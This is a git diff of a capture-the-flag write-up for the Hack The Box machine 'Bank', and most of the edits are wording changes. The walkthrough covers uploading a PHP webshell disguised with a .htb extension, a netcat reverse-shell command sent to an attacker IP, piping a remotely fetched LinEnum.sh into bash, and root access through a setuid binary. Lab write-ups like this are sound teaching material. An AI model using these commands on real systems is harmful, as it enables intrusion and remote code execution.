@@ -75,12 +75,12 @@ www.bank.htb.           604800  IN      CNAME   bank.htb.
 bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
 ```
 
-We get some subdomains that we will put into our hosts file.
+There are some subdomains that we will put into our hosts file.
 
 ## Checking HTTP (Port 80)
 
-On the web page we see the default Apache2 Ubuntu installation page.
-As we found out there is a domain name, we can browse to the web page with the domain name _bank.htb_ and we get a login page.
+On the web page it displays the default Apache2 Ubuntu installation page.
+As we found out, there is a domain name, we can browse to the web page with the domain name _bank.htb_ and we get a login page.
 This is called **Virtual Host Routing**.
 
 ![Bank login page](https://kyuu-ji.github.io/htb-write-up/bank/bank_login.png)
@@ -99,7 +99,7 @@ There are these directories that could be interesting:
 
 ### Method 1 - Ignore redirects
 
-With Burpsuite we can look on the web pages that redirect us by changing the HTTP response code from _302 Found_ to HTTP code _200 OK_.
+With Burpsuite it is possible to see the web pages that redirect us by changing the HTTP response code from _302 Found_ to HTTP code _200 OK_.
 
 This is the index.php page:
 
@@ -114,7 +114,7 @@ We can upload code on the support.php to get command execution on the box.
 
 ### Method 2 - Intended way
 
-The directory _balance-transfers_ that we found has many of these files in it:
+The directory _balance-transfers_ has many of these files in it:
 
 ![Bank balance-transfers page](https://kyuu-ji.github.io/htb-write-up/bank/bank_balance-transfers.png)
 
@@ -140,7 +140,7 @@ Lets download all of them, to examine them easier in the shell.
 wget -r http://bank.htb/balance-transfer/
 ```
 
-By sorting them by file size we see that most of them have either 583, 584 or 585 bytes except for one that has 257 bytes.
+By sorting them by file size it becomes clear that most of them have either 583, 584 or 585 bytes except for one that has 257 bytes.
 ```markdown
 wc -c \*.acc | sort -n -r
 ```
@@ -164,18 +164,18 @@ Balance: 8842803 .
 
 When trying this credentials on the login page we get logged in.
 
-There is a _Support_ page where we can upload files.
+There is a _Support_ page where it is possible to upload files.
 
 ![Bank support page](https://kyuu-ji.github.io/htb-write-up/bank/bank_support-2.png)
 
-The page allows images but doesn't allow PHP files to be uploaded. Looking at the source we see a comment that says:
+The page allows images but doesn't allow PHP files to be uploaded. Looking at the source there is a comment that says:
 > [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]
 
 So lets change the extension of our file to _.htb_ instead.
 
 ![File upload](https://kyuu-ji.github.io/htb-write-up/bank/bank_file-upload.png)
 
-We see the uploaded files in the web page and can click on the attachment to browse to that file. Now we can execute commands:
+The uploaded files are in the center of the support page and clicking on the attachment to browse to that file. Now we can execute commands:
 ```markdown
 http://bank.htb/uploads/logo.htb?cmd=whoami
 ```
@@ -185,11 +185,11 @@ This gives us the output that we are _www-data_. Lets start a reverse shell with
 http://bank.htb/uploads/logo.htb?cmd=nc%20-e%20/bin/sh%2010.10.14.23%209001
 ```
 
-After a short while the the request gets sent to my listener that waits for connections on my IP and port 9001 and we started a reverse shell as www-data!
+After a short while the the request gets sent to my listener that waits for connections on my IP and port 9001 and started a reverse shell as www-data!
 
 ## Privilege Escalation
 
-When looking at the PHP files from the server, we find credentials for MySQL in the file **/var/www/bank/inc/user.php**:
+When looking at the PHP files from the server, there are credentials for MySQL in the file **/var/www/bank/inc/user.php**:
 ```php
 # (...)
 function getUsername($email){
@@ -201,7 +201,7 @@ function getUsername($email){
 # (...)
 ```
 
-We can login into MySQL but don't find anything important and starting a shell from there won't give us a root shell:
+We can login into MySQL but don't find anything important and starting a shell from there won't start a root shell:
 ```markdown
 mysql -u root -p
 
@@ -214,5 +214,5 @@ The password won't work on the _chris_ nor the _root_ user, so we will execute a
 wget http://10.10.14.23/LinEnum.sh | bash
 ```
 
-Looking at the results we see that there is a _setuid bit_ set on the **/var/htb/bin/emergency** binary that is not a default Linux binary.
+Looking at the results, there is a _setuid bit_ set on the **/var/htb/bin/emergency** binary that is not a default Linux binary.
 When executing this, we drop into a shell with the effective user ID of root and finished the box!
